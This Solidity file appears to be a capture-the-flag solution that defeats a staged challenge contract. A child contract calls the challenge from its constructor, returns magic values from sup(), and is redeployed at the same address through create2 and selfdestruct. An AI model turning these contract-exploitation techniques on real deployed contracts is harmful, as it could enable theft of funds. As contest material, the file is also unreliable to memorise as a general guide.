// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ICalled {
    function sup() external returns (uint256);
}

interface IChallenge_teryanarmen {
    enum State {
        THREE,
        TWO,
        ONE,
        ZERO
    }

    function first() external;

    function second() external;

    function third() external;

    function fourth() external;

    function winner() external view returns (address);

    function state() external view returns (State);
}

contract Child {
    IChallenge_teryanarmen instance;

    constructor(IChallenge_teryanarmen _instance) {
        instance = _instance;

        if (instance.state() == IChallenge_teryanarmen.State.THREE) {
            console.log("third");
            instance.third();
        } else if (instance.state() == IChallenge_teryanarmen.State.ONE) {
            console.log("first");
            instance.first();
        }
    }

    function finalize() external {
        if (instance.state() == IChallenge_teryanarmen.State.TWO) {
            console.log("second");
            instance.second();
        } else if (instance.state() == IChallenge_teryanarmen.State.ZERO) {
            console.log("fourth");
            instance.fourth();
        }
    }

    function sup() external view returns (uint256) {
        if (instance.state() == IChallenge_teryanarmen.State.TWO) {
            return 1337;
        } else if (instance.state() == IChallenge_teryanarmen.State.ZERO) {
            return 80085;
        }
        return 0;
    }

    function destroy() external {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}

contract Exploit_teryanarmen {
    IChallenge_teryanarmen instance;
    Child child;

    constructor(IChallenge_teryanarmen _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        deployChild();
        child.finalize();
        child.destroy();
    }

    function deployChild() public {
        bytes memory bytecode = abi.encodePacked(type(Child).creationCode, abi.encode(address(instance)));

        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), 0)

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }

        child = Child(payable(addr));
    }
}
